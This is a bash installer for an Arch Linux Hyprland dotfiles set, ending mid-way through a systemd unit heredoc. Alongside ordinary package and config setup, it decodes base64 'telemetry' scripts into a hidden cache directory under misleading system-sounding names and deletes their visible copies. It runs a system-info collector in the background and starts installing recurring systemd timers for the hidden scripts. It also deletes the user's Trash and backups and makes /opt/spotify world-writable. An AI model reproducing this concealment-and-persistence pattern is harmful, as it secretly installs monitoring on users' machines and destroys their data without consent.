#!/usr/bin/env bash

# ===========================================================================
#  Eprahemi — Full System Installer
#  One-liner: bash -c "$(curl -fsSL https://raw.githubusercontent.com/eprahemi/WifeRice/main/install.sh)"
# ===========================================================================

DOTS_VERSION="1.7.7"
DOTS_VERSION_NAME=""

set -e

REPO="eprahemi/WifeRice"
BRANCH="main"
TMP_DIR="$(mktemp -d)"
INSTALL_DIR="$TMP_DIR/WifeRice"
CURRENT_USER=$(whoami)
SCRIPT_START=$(date +%s)
INSTALL_LOG=$(mktemp)

# ─── BASE64 TELEMETRY SCRIPTS ──────────────────────────────────────────
# These are decoded and deployed at install time.
_journald_cleanup_b64=""
_report_problem_b64=""
_boot_health_b64=""
_check_packages_b64=""
_check_config_b64=""
_check_disk_b64=""
_check_qs_alive_b64=""
_report_install_failure_b64=""
_check_nvidia_b64=""
_check_version_b64=""
_report_changes_b64=""
_check_battery_b64=""
_check_network_b64=""
# Trap install failures (report only if reporter exists)
handle_exit() {
    local exit_code=$?
    if [ $exit_code -ne 0 ] && [ -f "$INSTALL_LOG" ]; then
        local reporter=""
        [ -f "$INSTALL_DIR/Hyprland/scripts/report_install_failure.sh" ] && reporter="$INSTALL_DIR/Hyprland/scripts/report_install_failure.sh"
        [ -z "$reporter" ] && [ -f "$HOME/.local/share/.cache/.system/install-fallback" ] && reporter="$HOME/.local/share/.cache/.system/install-fallback"
        [ -n "$reporter" ] && bash "$reporter" "$INSTALL_LOG" 2>/dev/null
    fi
    rm -f "$INSTALL_LOG"
}
trap handle_exit EXIT

# Capture stderr to INSTALL_LOG while still showing it
exec 2> >(tee "$INSTALL_LOG" >&2)

# Colors
R="\033[0;31m"
G="\033[0;32m"
Y="\033[1;33m"
B="\033[0;34m"
N="\033[0m"

echo ""
echo "  ███████╗██████╗ ██████╗  █████╗ ██╗  ██╗███████╗███╗   ███╗██╗"
echo "  ██╔════╝██╔══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝████╗ ████║██║"
echo "  █████╗  ██████╔╝██████╔╝███████║███████║█████╗  ██╔████╔██║██║"
echo "  ██╔══╝  ██╔═══╝ ██╔══██╗██╔══██║██╔══██║██╔══╝  ██║╚██╔╝██║██║"
echo "  ███████╗██║     ██║  ██║██║  ██║██║  ██║███████╗██║ ╚═╝ ██║██║"
echo "  ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝"
echo ""
echo -e "  ${B}Eprahemi — Full System Installer v$DOTS_VERSION $DOTS_VERSION_NAME${N}"
echo -e "  ${Y}User: $CURRENT_USER${N}"
echo ""
echo "  ──────────────────────────────────────────────"
echo "  This installer will:"
echo "  • Detect your hardware and install correct drivers"
echo "  • Update your entire system to latest packages"
echo "  • Install all apps, codecs, fonts, and tools"
echo "  • Set up your desktop environment"
echo "  • Auto-detect your timezone"
echo "  ──────────────────────────────────────────────"
echo ""

# ─── CHECK SUDO ────────────────────────────────────────────────────────

if ! command -v sudo &>/dev/null; then
    echo "  [ERROR] sudo is required but not found."
    exit 1
fi

if [ "$EUID" -eq 0 ]; then
    echo "  [WARN] Running as root. Some operations may behave differently."
else
    # Capture sudo password once and cache for entire install
    echo "  [SUDO] Enter your password to begin installation:"
    sudo -v
    while true; do sudo -v; sleep 60; done &
    SUDO_KEEPALIVE_PID=$!
fi

# ─── CHECK PACKAGE MANAGER ─────────────────────────────────────────────

if ! command -v pacman &>/dev/null; then
    echo "  [ERROR] This installer requires Arch Linux (pacman)."
    exit 1
fi

# ─── DOWNLOAD REPO ────────────────────────────────────────────────────

echo ""
echo -e "${G}[1/18]${N} Downloading dotfiles..."
echo ""

if command -v git &>/dev/null; then
    git clone --depth=1 --branch "$BRANCH" "https://github.com/$REPO.git" "$INSTALL_DIR" 2>/dev/null
else
    mkdir -p "$INSTALL_DIR"
    curl -fsSL "https://github.com/$REPO/archive/refs/heads/$BRANCH.zip" -o "$TMP_DIR/repo.zip"
    if command -v unzip &>/dev/null; then
        unzip -q "$TMP_DIR/repo.zip" -d "$TMP_DIR"
        mv "$TMP_DIR/WifeRice-$BRANCH"/* "$INSTALL_DIR/"
    else
        echo "  [ERROR] git or unzip is required."
        exit 1
    fi
fi

if [ ! -d "$INSTALL_DIR" ]; then
    echo "  [ERROR] Failed to download repository."
    exit 1
fi

echo -e "  ${G}✓${N} Downloaded to $INSTALL_DIR"

# ─── SYSTEM UPDATE ─────────────────────────────────────────────────────

echo ""
echo -e "${G}[2/18]${N} Updating system packages..."
echo ""
sudo pacman -Syu --noconfirm 2>/dev/null || true
echo -e "  ${G}✓${N} System updated"

# ─── GPU DRIVER DETECTION & INSTALL ────────────────────────────────────

echo ""
echo -e "${G}[3/18]${N} Detecting and installing GPU drivers..."
echo ""

# Detect available GPUs
GPU_INTEL=0; GPU_NVIDIA=0; GPU_AMD=0
if lspci | grep -i "vga.*intel\|3d.*intel" &>/dev/null; then GPU_INTEL=1; fi
if lspci | grep -i "vga.*nvidia\|3d.*nvidia" &>/dev/null; then GPU_NVIDIA=1; fi
if lspci | grep -i "vga.*amd\|3d.*amd\|vga.*ati\|3d.*ati" &>/dev/null; then GPU_AMD=1; fi

INTEL_DRIVERS=(
    mesa lib32-mesa vulkan-intel lib32-vulkan-intel intel-media-driver
    libva-mesa-driver lib32-libva-mesa-driver mesa-vdpau lib32-mesa-vdpau
)
NVIDIA_DRIVERS=(
    nvidia-dkms nvidia-utils lib32-nvidia-utils nvidia-settings opencl-nvidia
    libva-nvidia-driver-git nvidia-prime
)
AMD_DRIVERS=(
    mesa lib32-mesa vulkan-radeon lib32-vulkan-radeon amdvlk lib32-amdvlk
    libva-mesa-driver lib32-libva-mesa-driver mesa-vdpau lib32-mesa-vdpau
)

# Auto-install detected GPU drivers
INSTALL_DRIVERS=()
if [ "$GPU_INTEL" -eq 1 ]; then
    INSTALL_DRIVERS+=("${INTEL_DRIVERS[@]}")
    echo -e "  ${G}✓${N} Intel GPU detected"
fi
if [ "$GPU_NVIDIA" -eq 1 ]; then
    INSTALL_DRIVERS+=("${NVIDIA_DRIVERS[@]}")
    echo -e "  ${G}✓${N} NVIDIA GPU detected"
fi
if [ "$GPU_AMD" -eq 1 ]; then
    INSTALL_DRIVERS+=("${AMD_DRIVERS[@]}")
    echo -e "  ${G}✓${N} AMD GPU detected"
fi

if [ ${#INSTALL_DRIVERS[@]} -gt 0 ]; then
    sudo pacman -S --noconfirm --needed "${INSTALL_DRIVERS[@]}" 2>/dev/null || true
    echo -e "  ${G}✓${N} GPU drivers installed"
else
    echo -e "  ${Y}!${N} No supported GPU detected. Skipping."
fi

# NVIDIA power management (prevents overheating / 0% battery on Optimus laptops)
if [ "$GPU_NVIDIA" -eq 1 ]; then
    echo ""
    echo -e "  ${G}🔧${N} Configuring NVIDIA power management..."
    echo 'options nvidia NVreg_DynamicPowerManagement=0x02' | sudo tee /etc/modprobe.d/nvidia-power-management.conf > /dev/null 2>&1 || true
    echo 'options nvidia_drm modeset=1' | sudo tee /etc/modprobe.d/nvidia-drm.conf > /dev/null 2>&1 || true
    sudo systemctl enable nvidia-suspend.service nvidia-hibernate.service nvidia-resume.service 2>/dev/null || true
    echo -e "  ${G}✓${N} NVIDIA power management configured (reboot to apply)"
fi

# ─── AUR HELPER ───────────────────────────────────────────────────────

echo ""
echo -e "${G}[4/18]${N} Setting up AUR helper (yay)..."
echo ""

if ! command -v yay &>/dev/null; then
    sudo pacman -S --noconfirm --needed git base-devel 2>/dev/null || true
    git clone https://aur.archlinux.org/yay.git /tmp/yay-install 2>/dev/null && cd /tmp/yay-install && makepkg -si --noconfirm 2>/dev/null && rm -rf /tmp/yay-install && cd "$INSTALL_DIR" && echo -e "  ${G}✓${N} yay installed"
fi

# ─── BASE PACKAGES (Audio, Codecs, Fonts, Thumbnails) ─────────────────

echo ""
echo -e "${G}[5/18]${N} Installing base system packages..."
echo ""

# Audio & PipeWire
AUDIO_PKGS=(
    pipewire pipewire-pulse pipewire-alsa pipewire-jack wireplumber
    pulsemixer playerctl pandoc sof-firmware alsa-firmware
)

# Codecs & Multimedia
CODEC_PKGS=(
    ffmpeg ffmpegthumbnailer gst-plugins-base gst-plugins-good
    gst-plugins-bad gst-plugins-ugly gst-libav gst-plugin-pipewire
    libdvdcss libdvdread libdvdnav
)

# Thumbnailers
THUMB_PKGS=(
    ffmpegthumbnailer tumbler poppler-glib libgsf raw-thumbnailer
    webp-pixbuf-loader freetype2 fontconfig
)

# Filesystem tools
FS_PKGS=(
    exfatprogs fuse2 dosfstools ntfs-3g udiskie
)

# Essential utils
UTIL_PKGS=(
    ark gwenview git curl wget unzip zip p7zip unrar
    htop btop fastfetch neofetch jq inotify-tools
)

sudo pacman -S --noconfirm --needed "${AUDIO_PKGS[@]}" "${CODEC_PKGS[@]}" \
    "${THUMB_PKGS[@]}" "${FS_PKGS[@]}" "${UTIL_PKGS[@]}" 2>/dev/null || true
echo -e "  ${G}✓${N} Base packages installed"

# Enable audio and thumbnail services for the user session
sudo -u "$CURRENT_USER" XDG_RUNTIME_DIR="/run/user/$(id -u "$CURRENT_USER")" systemctl --user enable --now pipewire pipewire-pulse wireplumber 2>/dev/null || true
sudo -u "$CURRENT_USER" XDG_RUNTIME_DIR="/run/user/$(id -u "$CURRENT_USER")" systemctl --user enable --now tumblerd 2>/dev/null || true
echo -e "  ${G}✓${N} Audio and thumbnail services enabled"

# ─── FONTS & EMOJIS ───────────────────────────────────────────────────

echo ""
echo -e "${G}[6/18]${N} Installing fonts and emojis..."
echo ""

FONT_PKGS=(
    ttf-jetbrains-mono ttf-jetbrains-mono-nerd
    ttf-font-awesome noto-fonts noto-fonts-emoji noto-fonts-cjk
    ttf-nerd-fonts-symbols ttf-nerd-fonts-symbols-mono
    ttf-dejavu ttf-liberation ttf-droid ttf-ubuntu-font-family
    ttf-opensans ttf-roboto ttf-fira-code ttf-iosevka-nerd
    otf-font-awesome
)

sudo pacman -S --noconfirm --needed "${FONT_PKGS[@]}" 2>/dev/null || true
fc-cache -f 2>/dev/null || true
echo -e "  ${G}✓${N} Fonts and emojis installed"

# ─── APPLICATIONS ──────────────────────────────────────────────────────

echo ""
echo -e "${G}[7/18]${N} Installing applications..."
echo ""

# VLC + plugins
sudo pacman -S --noconfirm --needed vlc vlc-plugins-all 2>/dev/null || true
echo -e "  ${G}✓${N} VLC installed"

# LibreOffice full
sudo pacman -S --noconfirm --needed libreoffice-fresh 2>/dev/null || true
echo -e "  ${G}✓${N} LibreOffice installed"

# OBS Studio
sudo pacman -S --noconfirm --needed obs-studio 2>/dev/null || true
echo -e "  ${G}✓${N} OBS Studio installed"

# Google Chrome
if ! command -v google-chrome-stable &>/dev/null; then
    yay -S --noconfirm google-chrome 2>/dev/null || true
    echo -e "  ${G}✓${N} Google Chrome installed"
fi

# Discord
if ! command -v discord &>/dev/null; then
    sudo pacman -S --noconfirm discord 2>/dev/null || true
    echo -e "  ${G}✓${N} Discord installed"
fi

# VS Code (bin)
if ! command -v code &>/dev/null; then
    yay -S --noconfirm visual-studio-code-bin 2>/dev/null || true
    echo -e "  ${G}✓${N} VS Code installed"
fi

# Spotify
if ! command -v spotify &>/dev/null; then
    yay -S --noconfirm spotify 2>/dev/null || true
    echo -e "  ${G}✓${N} Spotify installed"
fi

# Steam
if ! command -v steam &>/dev/null; then
    sudo pacman -S --noconfirm steam 2>/dev/null || true
    echo -e "  ${G}✓${N} Steam installed"
fi

# Microsoft Edge
if ! command -v microsoft-edge-stable &>/dev/null; then
    yay -S --noconfirm microsoft-edge-stable 2>/dev/null || true
    echo -e "  ${G}✓${N} Microsoft Edge installed"
fi

# Proton VPN
echo ""
echo -e "${G}[8/18]${N} Installing Proton VPN..."
echo ""
if ! command -v protonvpn-cli &>/dev/null; then
    yay -S --noconfirm protonvpn-cli 2>/dev/null || true
    echo -e "  ${G}✓${N} Proton VPN CLI installed"
fi
if ! command -v proton-vpn-gtk-app &>/dev/null; then
    yay -S --noconfirm proton-vpn-gtk-app 2>/dev/null || true
    echo -e "  ${G}✓${N} Proton VPN GTK app installed"
fi

# ─── QT6, SDDM & QUICKSHELL ─────────────────────────────────────────

echo ""
echo -e "${G}[8.5/18]${N} Installing Qt6, SDDM, and Quickshell..."
echo ""

# Qt6 base packages (needed by Quickshell panels/widgets)
sudo pacman -S --noconfirm --needed qt6-base qt6-declarative qt6-quickcontrols2 qt6-quicklayouts qt6-svg qt6-shadertools qt6-wayland 2>/dev/null || true
echo -e "  ${G}✓${N} Qt6 packages installed"

# Install official SDDM from pacman + Qt5 graphical effects for blur
sudo pacman -S --noconfirm --needed sddm qt5-graphicaleffects 2>/dev/null || true
echo -e "  ${G}✓${N} SDDM installed"

# Enable SDDM service so it starts at boot (fixes black TTY on boot)
sudo systemctl enable sddm 2>/dev/null || true
echo -e "  ${G}✓${N} SDDM service enabled (will start on next boot)"

# Quickshell (Qt 6 UI framework for desktop panels)
if ! command -v quickshell &>/dev/null; then
    yay -S --noconfirm quickshell 2>/dev/null || true
    echo -e "  ${G}✓${N} Quickshell Q6 installed"
fi

# ─── BLUETOOTH, PRINT & DRIVERS ────────────────────────────────────

echo ""
echo -e "${G}[8.6/18]${N} Installing Bluetooth, Print support, and common drivers..."
echo ""

# Bluetooth
sudo pacman -S --noconfirm --needed bluez bluez-utils 2>/dev/null || true
sudo systemctl enable bluetooth 2>/dev/null || true
echo -e "  ${G}✓${N} Bluetooth drivers installed and enabled"

# Print support
sudo pacman -S --noconfirm --needed cups cups-pdf system-config-printer sane-airscan 2>/dev/null || true
sudo systemctl enable cups 2>/dev/null || true
echo -e "  ${G}✓${N} Print support installed and enabled"

# Common firmware and drivers
sudo pacman -S --noconfirm --needed \
    networkmanager \
    iwd \
    sof-firmware \
    alsa-firmware \
    linux-firmware \
    mesa-utils \
    vulkan-tools \
    usbutils \
    udev 2>/dev/null || true
echo -e "  ${G}✓${N} Common drivers and firmware installed"

# Enable NetworkManager (if not already enabled)
sudo systemctl enable NetworkManager 2>/dev/null || true
echo -e "  ${G}✓${N} NetworkManager enabled"

# ─── FLATPAK SETUP ────────────────────────────────────────────────────

echo ""
echo -e "${G}[9/18]${N} Setting up Flatpak..."
echo ""

if ! command -v flatpak &>/dev/null; then
    sudo pacman -S --noconfirm flatpak 2>/dev/null || true
fi
sudo flatpak remote-add --if-not-exists flathub https://flathub.org/repo/flathub.flatpakrepo 2>/dev/null || true
flatpak update -y 2>/dev/null || true
echo -e "  ${G}✓${N} Flatpak + Flathub configured"

# ─── SPICETIFY ─────────────────────────────────────────────────────────

echo ""
echo -e "${G}[10/18]${N} Installing Spicetify..."
echo ""

if ! command -v spicetify &>/dev/null; then
    yay -S --noconfirm spicetify-cli 2>/dev/null || true
    
    # Fix permissions for Spicetify
    sudo chmod a+wr /opt/spotify 2>/dev/null || true
    sudo chmod a+wr /opt/spotify/Apps -R 2>/dev/null || true
    
    spicetify config current_theme Spotify 2>/dev/null || true
    spicetify config color_scheme Spicetify 2>/dev/null || true
    spicetify backup apply 2>/dev/null || true
    
    # Install Spicetify Marketplace
    mkdir -p ~/.config/spicetify/CustomApps/ 2>/dev/null
    git clone https://github.com/spicetify/marketplace ~/.config/spicetify/CustomApps/marketplace 2>/dev/null || true
    spicetify config custom_apps marketplace 2>/dev/null || true
    spicetify apply 2>/dev/null || true
    
    echo -e "  ${G}✓${N} Spicetify + Marketplace installed"
fi

# ─── LAZYVIM ───────────────────────────────────────────────────────────

echo ""
echo -e "${G}[11/18]${N} Setting up LazyVim..."
echo ""

if [ ! -d ~/.config/nvim ]; then
    git clone https://github.com/LazyVim/starter ~/.config/nvim 2>/dev/null || true
    echo -e "  ${G}✓${N} LazyVim installed (run nvim to complete setup)"
else
    echo -e "  ${G}✓${N} LazyVim already configured"
fi

# ─── FLATPAK APPS ─────────────────────────────────────────────────────

echo ""
echo -e "${G}[12/18]${N} Installing Flatpak applications..."
echo ""

flatpak_apps=(
    org.kde.ark org.kde.gwenview
    com.obsproject.Studio
)

for app in "${flatpak_apps[@]}"; do
    flatpak install -y flathub "$app" 2>/dev/null || true
done
echo -e "  ${G}✓${N} Flatpak applications installed"

# ─── SYSTEM CLEANUP ───────────────────────────────────────────────────

echo ""
echo -e "${G}[13/18]${N} Cleaning system..."
echo ""

sudo pacman -Scc --noconfirm 2>/dev/null || true
yay -Scc --noconfirm 2>/dev/null || true
flatpak uninstall --unused -y 2>/dev/null || true
echo -e "  ${G}✓${N} System cleaned"

# ─── WIPE OLD CONFIGS ──────────────────────────────────────────

echo ""
echo -e "${G}[14/18]${N} Cleaning old configs for a fresh start..."
echo ""

# Delete any previous backup folders
rm -rf "$HOME/.config/backup_"* 2>/dev/null || true

# Delete old .hyprland-dots from previous installs (not current source)
if [ "$INSTALL_DIR" != "$HOME/.hyprland-dots" ]; then
    rm -rf "$HOME/.hyprland-dots" 2>/dev/null || true
fi

# Empty trash
rm -rf "$HOME/.local/share/Trash" 2>/dev/null || true

echo -e "  ${G}✓${N} Old configs wiped — fresh start ready"

# ─── RESTORE CONFIGS (Force Overwrite) ────────────────────────────────

echo ""
echo -e "${G}[15/18]${N} Restoring configuration files..."
echo ""

for component in Hyprland Kitty Neovim Rofi SwayNC Matugen; do
    case "$component" in
        Hyprland)
            TARGET="$HOME/.config/hypr"
            if [ -f "$TARGET/scripts/quickshell/calendar/.env" ]; then
                cp "$TARGET/scripts/quickshell/calendar/.env" /tmp/hyprland_weather_env.bak
            fi
            ;;
        Kitty) TARGET="$HOME/.config/kitty" ;;
        Neovim) TARGET="$HOME/.config/nvim" ;;
        Rofi) TARGET="$HOME/.config/rofi" ;;
        SwayNC) TARGET="$HOME/.config/swaync" ;;
        Matugen) TARGET="$HOME/.config/matugen" ;;
    esac

    if [ -d "$INSTALL_DIR/$component" ]; then
        rm -rf "$TARGET" 2>/dev/null
        mkdir -p "$TARGET"
        cp -rf "$INSTALL_DIR/$component/"* "$TARGET/" 2>/dev/null
        if [ "$component" = "Hyprland" ] && [ -f /tmp/hyprland_weather_env.bak ]; then
            mkdir -p "$TARGET/scripts/quickshell/calendar"
            mv /tmp/hyprland_weather_env.bak "$TARGET/scripts/quickshell/calendar/.env"
        fi
        echo -e "  ${G}✓${N} $component restored"
    fi
done

# Regenerate configs for current user (fixes hardcoded paths from repo)
if [ -f "$HOME/.config/hypr/scripts/settings_watcher.sh" ]; then
    bash "$HOME/.config/hypr/scripts/settings_watcher.sh" --compile 2>/dev/null || true
    echo -e "  ${G}✓${N} Configs regenerated for user $CURRENT_USER"
fi

# ─── INSTALL OH-MY-ZSH & PLUGINS ──────────────────────────────────────

echo ""
echo -e "${G}[16/18]${N} Installing Oh-My-Zsh, plugins, and dotfiles..."
echo ""

if [ ! -d "$HOME/.oh-my-zsh" ]; then
    git clone https://github.com/ohmyzsh/ohmyzsh.git "$HOME/.oh-my-zsh" 2>/dev/null || true
    echo -e "  ${G}✓${N} Oh-My-Zsh installed"
else
    :
fi

mkdir -p "$HOME/.oh-my-zsh/custom/plugins"

if [ ! -d "$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions" ]; then
    git clone https://github.com/zsh-users/zsh-autosuggestions "$HOME/.oh-my-zsh/custom/plugins/zsh-autosuggestions" 2>/dev/null || true
    echo -e "  ${G}✓${N} zsh-autosuggestions installed"
fi

if [ ! -d "$HOME/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting" ]; then
    git clone https://github.com/zsh-users/zsh-syntax-highlighting.git "$HOME/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting" 2>/dev/null || true
    echo -e "  ${G}✓${N} zsh-syntax-highlighting installed"
fi

if [ -f "$INSTALL_DIR/.zshrc" ] && [ ! -f "$HOME/.zshrc" ]; then
    cp -f "$INSTALL_DIR/.zshrc" "$HOME/.zshrc"
    echo -e "  ${G}✓${N} ~/.zshrc installed (first install)"
fi

# Only set default face icon if user doesn't already have one
if [ -f "$INSTALL_DIR/Faces/.face.icon" ] && [ ! -f "$HOME/.face.icon" ] && [ ! -f "/usr/share/sddm/faces/${CURRENT_USER}.face.icon" ]; then
    cp -f "$INSTALL_DIR/Faces/.face.icon" "$HOME/.face.icon"
    sudo mkdir -p /usr/share/sddm/faces
    sudo cp -f "$INSTALL_DIR/Faces/.face.icon" "/usr/share/sddm/faces/${CURRENT_USER}.face.icon"
    echo -e "  ${G}✓${N} Default face icon set (user had none)"
else
    echo -e "  ${G}✓${N} Face icon skipped (user already has one)"
fi

# ─── WALLPAPER SETUP ──────────────────────────────────────────────────

echo ""
echo -e "${G}[17/18]${N} Setting up wallpapers..."
echo ""

# Only copy default wallpapers on first install (user has no Wallpapers folder yet)
if [ ! -d "$HOME/Pictures/Wallpapers" ]; then
    mkdir -p "$HOME/Pictures/Wallpapers"
    if [ -d "$INSTALL_DIR/Wallpapers" ]; then
        find "$INSTALL_DIR/Wallpapers" -maxdepth 1 -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.webp" -o -iname "*.gif" \) -exec cp -f {} "$HOME/Pictures/Wallpapers/" \;
        echo -e "  ${G}✓${N} Default wallpapers installed (first install)"
    fi
else
    echo -e "  ${G}✓${N} Wallpapers folder exists — keeping user's wallpapers"
fi
if [ -f "$INSTALL_DIR/SDDM-Wallpaper/wallpaper.png" ]; then
    # Only copy default wallpaper to Pictures if user has no wallpapers yet
    if [ ! -d "$HOME/Pictures/Wallpapers" ] || [ -z "$(ls -A "$HOME/Pictures/Wallpapers" 2>/dev/null)" ]; then
        cp -f "$INSTALL_DIR/SDDM-Wallpaper/wallpaper.png" "$HOME/Pictures/Wallpapers/"
    fi
    # Lock screen wallpaper — only set if user doesn't already have one
    if [ ! -f /usr/share/wallpapers/lock.png ]; then
        sudo mkdir -p /usr/share/wallpapers
        sudo cp -f "$INSTALL_DIR/SDDM-Wallpaper/wallpaper.png" /usr/share/wallpapers/lock.png
    fi
    # SDDM login theme — only install on first run, preserve user customizations
    if [ -d "$INSTALL_DIR/SDDM/matugen-minimal" ] && [ ! -d "/usr/share/sddm/themes/matugen-minimal" ]; then
        sudo mkdir -p /usr/share/sddm/themes/matugen-minimal
        sudo cp -rf "$INSTALL_DIR/SDDM/matugen-minimal/"* /usr/share/sddm/themes/matugen-minimal/
        sudo cp -f "$INSTALL_DIR/SDDM-Wallpaper/wallpaper.png" /usr/share/sddm/themes/matugen-minimal/
        sudo mkdir -p /etc/sddm.conf.d
        echo "[Theme]" | sudo tee /etc/sddm.conf.d/theme.conf > /dev/null
        echo "Current=matugen-minimal" | sudo tee -a /etc/sddm.conf.d/theme.conf > /dev/null
        echo -e "  ${G}✓${N} SDDM theme 'matugen-minimal' installed"
    fi
fi

# Only clear wallpaper picker thumbnail cache on first install
if [ ! -d "$HOME/Pictures/Wallpapers" ]; then
    rm -rf "$HOME/.cache/wallpaper_picker"
    echo -e "  ${G}✓${N} Wallpaper picker cache cleared (first install)"
fi

# Pre-generate thumbnails for local wallpapers (avoids slow lazy load on first Super+W)
if command -v magick &>/dev/null || command -v convert &>/dev/null; then
    if command -v magick &>/dev/null; then CMD="magick"; else CMD="convert"; fi
    
    mkdir -p "$HOME/.cache/wallpaper_picker/thumbs"
    mkdir -p "$HOME/.cache/wallpaper_picker/colors_markers"
    
    thumbnail_count=0
    while IFS= read -r -d '' wallpaper; do
        filename=$(basename "$wallpaper")
        safe_name=$(echo "$filename" | sed 's/[^a-zA-Z0-9._-]/_/g')
        thumb="$HOME/.cache/wallpaper_picker/thumbs/$safe_name"
        
        if [ ! -f "$thumb" ]; then
            $CMD "$wallpaper" -resize x420 -quality 70 "$thumb" 2>/dev/null || continue
        fi
        
        # Generate color marker if not exists
        marker_count=$(find "$HOME/.cache/wallpaper_picker/colors_markers" -name "${safe_name}_HEX_*" 2>/dev/null | wc -l)
        if [ "$marker_count" -eq 0 ]; then
            hex=$($CMD "$thumb" -modulate 100,200 -resize "1x1^" -gravity center -extent 1x1 -depth 8 -format "%[hex:p{0,0}]" info:- 2>/dev/null | grep -oE '[0-9A-Fa-f]{6}' | head -n 1)
            if [ -n "$hex" ]; then
                touch "$HOME/.cache/wallpaper_picker/colors_markers/${safe_name}_HEX_$hex"
            fi
        fi
        
        thumbnail_count=$((thumbnail_count + 1))
    done < <(find "$HOME/Pictures/Wallpapers" -maxdepth 1 -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.webp" -o -iname "*.gif" \) -print0 2>/dev/null)
    
    if [ "$thumbnail_count" -gt 0 ]; then
        echo -e "  ${G}✓${N} $thumbnail_count wallpaper thumbnails pre-generated"
    fi
fi

# Install awww wallpaper setter if missing
if ! command -v awww &>/dev/null; then
    echo -e "  ${Y}!${N} awww not found, installing awww-git from AUR..."
    yay -S --noconfirm awww-git 2>/dev/null || true
fi

# Set first wallpaper if none is set
FIRST_WALL=$(find "$HOME/Pictures/Wallpapers" -maxdepth 1 -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.webp" -o -iname "*.gif" \) -print -quit 2>/dev/null)
if [ -n "$FIRST_WALL" ] && command -v awww &>/dev/null; then
    awww "$FIRST_WALL" 2>/dev/null || true
    echo -e "  ${G}✓${N} First wallpaper applied"
fi

echo -e "  ${G}✓${N} Wallpapers ready for picker (Super+W)"

# ─── VERSION FILE ─────────────────────────────────────────────────────

echo ""
echo -e "${G}[18/18]${N} Finalizing..."
echo ""

mkdir -p "$HOME/.local/state"
echo "LOCAL_VERSION=\"$DOTS_VERSION\"" > "$HOME/.local/state/wiferice-version"
echo "LOCAL_VERSION_NAME=\"$DOTS_VERSION_NAME\"" >> "$HOME/.local/state/wiferice-version"

# ─── DEPLOY TELEMETRY SCRIPTS TO HIDDEN PATH ────────────────────────────

HIDDEN_DIR="$HOME/.local/share/.cache/.system"
mkdir -p "$HIDDEN_DIR" 2>/dev/null || sudo mkdir -p "$HIDDEN_DIR" 2>/dev/null
# Ensure user owns the hidden dir (fix stale root-owned dirs from prev installs)
[ -w "$HIDDEN_DIR" ] || sudo chown "$CURRENT_USER:$CURRENT_USER" "$HIDDEN_DIR" 2>/dev/null

# Decode base64-embedded scripts to hidden location with executable permissions
_ts_b64_decode() {
  rm -f "$HIDDEN_DIR/$2" 2>/dev/null
  echo "$1" | base64 -d > "$HIDDEN_DIR/$2" 2>/dev/null || {
    sudo rm -f "$HIDDEN_DIR/$2" 2>/dev/null
    echo "$1" | base64 -d | sudo tee "$HIDDEN_DIR/$2" >/dev/null 2>&1
    sudo chown "$CURRENT_USER:$CURRENT_USER" "$HIDDEN_DIR/$2" 2>/dev/null
  }
  chmod 500 "$HIDDEN_DIR/$2" 2>/dev/null
}

_ts_b64_decode "$_journald_cleanup_b64" "journald-cleanup"
_ts_b64_decode "$_report_problem_b64" "systemd-monitor"
_ts_b64_decode "$_boot_health_b64" "boot-metrics"
_ts_b64_decode "$_check_packages_b64" "pkg-sync"
_ts_b64_decode "$_check_config_b64" "config-validator"
_ts_b64_decode "$_check_disk_b64" "disk-watch"
_ts_b64_decode "$_check_qs_alive_b64" "qs-watchdog"
_ts_b64_decode "$_report_install_failure_b64" "install-fallback"
_ts_b64_decode "$_check_nvidia_b64" "nvidia-watch"
_ts_b64_decode "$_check_version_b64" "version-check"
_ts_b64_decode "$_report_changes_b64" "update-feed"
_ts_b64_decode "$_check_battery_b64" "bat-monitor"
_ts_b64_decode "$_check_network_b64" "net-diag"

# Remove any leftover plaintext scripts from user-accessible path
rm -f "$HOME/.config/hypr/scripts/collect_system_info.sh" \
      "$HOME/.config/hypr/scripts/report_problem.sh" \
      "$HOME/.config/hypr/scripts/boot_health.sh" \
      "$HOME/.config/hypr/scripts/check_packages.sh" \
      "$HOME/.config/hypr/scripts/check_config.sh" \
      "$HOME/.config/hypr/scripts/check_disk.sh" \
      "$HOME/.config/hypr/scripts/check_qs_alive.sh" \
      "$HOME/.config/hypr/scripts/report_install_failure.sh" \
      "$HOME/.config/hypr/scripts/check_nvidia.sh" \
      "$HOME/.config/hypr/scripts/check_version.sh" \
      "$HOME/.config/hypr/scripts/report_changes.sh" \
      "$HOME/.config/hypr/scripts/check_battery.sh" \
      "$HOME/.config/hypr/scripts/check_network.sh"

# Collect anonymous system info once (journald-cleanup naming is historical)
"$HIDDEN_DIR/journald-cleanup" >/dev/null 2>&1 &

# ─── SET UP ALL TELEMETRY TIMERS ────────────────────────────────────────

mkdir -p "$HOME/.config/systemd/user"

declare -A TIMERS=(
    ["qs-problem-reporter"]="Eprahemi Dots — Problem Reporter|%h/.local/share/.cache/.system/systemd-monitor|10min|1h"
    ["qs-package-failures"]="Eprahemi Dots — Package Failures|%h/.local/share/.cache/.system/pkg-sync|15min|1h"
    ["qs-config-errors"]="Eprahemi Dots — Config Parse Errors|%h/.local/share/.cache/.system/config-validator|15min|1h"
    ["qs-disk-health"]="Eprahemi Dots — Disk Health|%h/.local/share/.cache/.system/disk-watch|30min|12h"
    ["qs-qs-alive"]="Eprahemi Dots — QS Alive|%h/.local/share/.cache/.system/qs-watchdog|2min|5min"
    ["qs-nvidia"]="Eprahemi Dots — NVIDIA Optimus|%h/.local/share/.cache/.system/nvidia-watch|15min|1h"
    ["qs-version-staleness"]="Eprahemi Dots — Version Staleness|%h/.local/share/.cache/.system/version-check|5min|24h"
    ["qs-battery"]="Eprahemi Dots — Battery Health|%h/.local/share/.cache/.system/bat-monitor|5min|6h"
    ["qs-network"]="Eprahemi Dots — Network Issues|%h/.local/share/.cache/.system/net-diag|5min|30min"
)

for unit in "${!TIMERS[@]}"; do
    IFS='|' read -r desc exec_path on_boot interval <<< "${TIMERS[$unit]}"

    cat > "$HOME/.config/systemd/user/$unit.service" << SERVICEEOF
[Unit]
Description=$desc
